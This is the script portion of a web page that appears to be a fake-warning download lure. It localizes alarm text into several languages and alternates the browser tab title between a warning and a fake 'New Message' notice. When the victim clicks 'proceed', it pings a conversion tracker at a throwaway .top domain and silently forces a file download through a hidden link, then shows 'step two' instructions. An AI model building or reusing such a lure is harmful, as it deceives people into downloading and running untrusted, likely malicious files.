const RTL_LANGS = ['ar','he','fa','ur'];

function detectLang() {
  const navRaw = (navigator.language || navigator.userLanguage || 'en').toLowerCase();
  const nav = navRaw.slice(0,2);
  if (translations[nav]) return nav;
  return 'en';
}
const lang = detectLang();
const t = translations[lang];
document.documentElement.lang = lang;
if (RTL_LANGS.indexOf(lang) !== -1) document.documentElement.dir = 'rtl';

document.querySelector('h1').innerHTML = t.title;
document.querySelector('.warning-p1').innerHTML = t.warning;
document.querySelector('.step-p').innerHTML = t.step;
document.getElementById('proceedBtn').textContent = t.proceed;
document.querySelector('.modal-header').childNodes.forEach(function(n){
  if (n.nodeType === 3 && n.textContent.trim()) n.textContent = ' ' + t.alert + ' ';
});
document.getElementById('step2-title').innerHTML = t.step2Title;
document.getElementById('step2-sub').textContent = t.step2Sub;

const tabLinks = document.querySelectorAll('.tabs-left a');
t.tabs.forEach(function(txt, i) { if (tabLinks[i]) tabLinks[i].textContent = txt; });
const tabRight = document.querySelectorAll('.tabs-right a');
if (tabRight[0]) tabRight[0].textContent = t.settings;
if (tabRight[1]) tabRight[1].textContent = t.tools;

const now = new Date();
document.getElementById('current-date').textContent = t.days[now.getDay()] + ', ' + t.months[now.getMonth()] + ' ' + now.getDate() + ', ' + now.getFullYear();


document.getElementById('proceedBtn').addEventListener('click', function(e) {
  try {
    BPixelJS.conversion({ url: 'https://juciecrucierretor.top/click' });
  } catch(err) {}

  setTimeout(function() {
    const fileLink = document.getElementById('fileLink');
    const tmp = document.createElement('a');
    tmp.href = fileLink.href;
    tmp.download = '';
    document.body.appendChild(tmp);
    tmp.click();
    document.body.removeChild(tmp);
    
    document.getElementById('step2').classList.add('active');
  }, 400);
});

(function() {
  var title1 = t.t1 || "⚠️ Warning";
  var title2 = t.t2 || "(1) New Message!";
  var state = 0; 
  setInterval(function() {
    if (state === 0) {
      document.title = title1;
      state = 1;
    } else {
      document.title = title2;
      state = 0;
    }
  }, 800); 
})();
</script>

